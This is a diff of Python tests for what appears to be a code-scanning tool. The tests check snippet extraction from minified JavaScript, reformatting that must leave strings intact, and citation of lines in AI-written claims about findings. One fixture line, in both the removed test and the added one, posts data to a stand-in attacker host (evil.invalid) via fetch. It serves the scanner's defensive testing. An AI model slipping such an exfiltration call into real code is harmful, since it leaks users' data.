@@ -91,13 +91,35 @@ def test_symlinks_and_escapes_are_never_read(tmp_path):
     assert context.snippet(root, "../secret.py", 1) is None
 
 
-def test_minified_line_is_cut_around_the_host(tmp_path):
-    line = "a=1;" * 2000 + 'fetch("https://evil.invalid/x",{body:t});' + "b=2;" * 2000
+def test_minified_line_is_reformatted_around_each_occurrence(tmp_path):
+    # a string full of code-looking text before the payload: a window cut inside it
+    # used to make the formatter read the string as code and rewrite the URL
+    line = (
+        'var s="a/b/c;x=1;" + "y";'
+        + "a=1;" * 2000
+        + 'fetch("/api/x/one",{headers:{Authorization:"Bearer ".concat(t)}});'
+        + "b=2;" * 2000
+        + 'fetch("/api/x/two",{headers:{Authorization:"Bearer ".concat(t)}});'
+    )
+    root = _pkg(tmp_path, {"card.js": line + "\n"})
+    hints = ('…fetch("/api/x/one",{headers', 'fetch("/api/x/two",{headers…')
+    snip = context.snippet(root, "card.js", 1, hints)
+    assert {g["file"] for g in snip["segments"]} == {"card.js#L1"}
+    text = "\n".join(c for g in snip["segments"] for c in g["code"])
+    assert '"/api/x/one"' in text and '"/api/x/two"' in text  # strings untouched
+    assert len(snip["segments"]) == 2  # one part per occurrence
+    assert all(len(g["code"]) <= 2 * context.PART_RADIUS + 1 for g in snip["segments"])
+
+
+def test_formatting_that_changes_more_than_whitespace_is_refused(tmp_path, monkeypatch):
+    monkeypatch.setattr(context.jsbeautifier, "beautify", lambda t, o: t.replace("evil", "good"))
+    context._formatted_cache.clear()
+    line = "a=1;" * 200 + 'fetch("https://evil.invalid/x",{body:t});' + "b=2;" * 200
     root = _pkg(tmp_path, {"card.js": line + "\n"})
     snip = context.snippet(root, "card.js", 1, "evil.invalid")
     (seg,) = snip["segments"]
-    assert "evil.invalid" in seg["code"][0] and len(seg["code"][0]) < 2 * context.WINDOW + 100
-    assert seg["col"] > 0
+    assert seg["file"] == "card.js" and "col" in seg and "evil.invalid" in seg["code"][0]
+    context._formatted_cache.clear()
 
 
 def test_long_function_is_windowed(tmp_path):
@@ -286,3 +308,21 @@ def test_leftover_punctuation_is_tidied(tmp_path):
     rep = _report(tmp_path)
     got = ai_context.accept(rep, "f1", {"claim_1": "It sends `anon_id`, (telemetry.py:9)."})
     assert got["claims"][0]["text"] == "It sends `anon_id`."
+
+
+def test_claims_can_cite_a_reformatted_part(tmp_path):
+    line = "a=1;" * 300 + 'fetch("/api/x/one",{headers:{Authorization:"Bearer ".concat(tok)}});'
+    root = _pkg(tmp_path, {"card.js": line + "\n"})
+    f = [{"id": "f1", "rule_id": "r", "severity": "medium", "file": "card.js", "line": 1,
+          "evidence": 'fetch("/api/x/one"'}]  # fmt: skip
+    rep = {"findings": f, "graph": {}, "context": context.build(root, f, None)}
+    snip = ai_context.snippet_of(rep, "f1")
+    n = next(
+        g["start"] + i
+        for g in snip["segments"]
+        for i, c in enumerate(g["code"])
+        if "Authorization" in c
+    )
+    claim = f"It sends `tok` in the `Authorization` header (card.js#L1:{n})."
+    got = ai_context.accept(rep, "f1", {"claim_1": claim})
+    assert got["claims"][0]["cites"] == [["card.js#L1", n, n]]
